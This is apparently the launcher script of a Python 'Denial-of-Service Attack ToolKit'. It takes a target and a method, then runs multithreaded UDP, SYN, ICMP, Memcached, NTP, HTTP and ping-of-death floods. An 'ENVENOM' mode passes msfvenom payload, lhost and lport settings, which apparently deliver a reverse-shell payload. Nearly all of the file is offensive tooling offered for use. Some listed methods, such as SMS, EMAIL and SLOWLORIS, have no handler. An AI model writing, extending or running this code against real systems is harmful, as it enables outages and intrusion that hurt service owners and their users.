#!/usr/bin/python3
import os
import sys
import argparse
import threading

os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
    from tools.L4.envenom import main as envenom_main
    from tools.L4.memcached import flood as memcached_flood
    from tools.L4.udp import flood as udp_flood
    from tools.L4.icmp import flood as icmp_flood
    from tools.L4.syn import flood as syn_flood
    from tools.L4.pod import flood as pod
    from tools.L4.ntp import flood as ntp_flood
    from tools.L7.http import flood as http_flood
except ImportError as err:
    CriticalError("Failed import some modules", err)
    sys.exit(1)

parser = argparse.ArgumentParser(description="Denial-of-Service Attack ToolKit")
parser.add_argument("--target", type=str, metavar="<IP:PORT, URL, PHONE>", help="Target IP:port, url or phone")
parser.add_argument("--method", type=str, metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP/ENVENOM>", help="Attack method")
parser.add_argument("--time", type=int, default=10, metavar="<time>", help="time in seconds")
parser.add_argument("--threads", type=int, default=3, metavar="<threads>", help="threads count (1-200)")

# Add envenom-specific argument parser
envenom_parser = parser.add_argument_group("Envenom Options")
envenom_parser.add_argument("--payload", type=str, help='Payload for msfvenom')
envenom_parser.add_argument("--lhost", type=str, help='Local host for msfvenom payload')
envenom_parser.add_argument("--lport", type=int, help='Local port for msfvenom payload')
envenom_parser.add_argument("--num_packets", type=int, default=100, help='Number of packets to send')
envenom_parser.add_argument("--burst_interval", type=float, default=0.1, help='Interval between packets in seconds')

# Get args
args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target

if not method or not target or not time:
    parser.print_help()
    sys.exit(1)

# Check for ENVENOM method and validate required arguments
if method == "ENVENOM":
    if not args.payload or not args.lhost or not args.lport:
        print("Error: --payload, --lhost, and --lport are required for the ENVENOM method.")
        parser.print_help()
        sys.exit(1)

    def envenom_attack():
        print(f"Sending packet to {target} with payload: {args.payload}, lhost: {args.lhost}, lport: {args.lport}")
        envenom_main(target, args.payload, args.lhost, args.lport, time)

    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=envenom_attack)
        t.daemon = True
        threads_list.append(t)
        t.start()
else:
    # Handle other methods (e.g., UDP) without requiring envenom-specific arguments
    print(f"Running attack with method: {method} on target: {target} for {time} seconds with {threads} threads.")
    
    def other_attack_method():
        if method == "UDP":
            for _ in range(threads):
                udp_flood(target)  # Call the UDP flood function
                print(f"[+] Sending packets to {target} using UDP method.")
        elif method == "SYN":
            for _ in range(threads):
                syn_flood(target)  # Call the SYN flood function
                print(f"[+] Sending packets to {target} using SYN method.")
        elif method == "ICMP":
            for _ in range(threads):
                icmp_flood(target)  # Call the ICMP flood function
                print(f"[+] Sending packets to {target} using ICMP method.")
        elif method == "MEMCACHED":
            for _ in range(threads):
                memcached_flood(target)  # Call the Memcached flood function
                print(f"[+] Sending packets to {target} using Memcached method.")
        elif method == "NTP":
            for _ in range(threads):
                ntp_flood(target)  # Call the NTP flood function
                print(f"[+] Sending packets to {target} using NTP method.")
        elif method == "HTTP":
            for _ in range(threads):
                http_flood(target)  # Call the HTTP flood function
                print(f"[+] Sending packets to {target} using HTTP method.")
        elif method == "PING_OF_DEATH":
            for _ in range(threads):
                pod(target)  # Call the Ping of Death function
                print(f"[+] Sending packets to {target} using Ping of Death method.")
        # Add more methods as needed

    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=other_attack_method)
        t.daemon = True
        threads_list.append(t)
        t.start()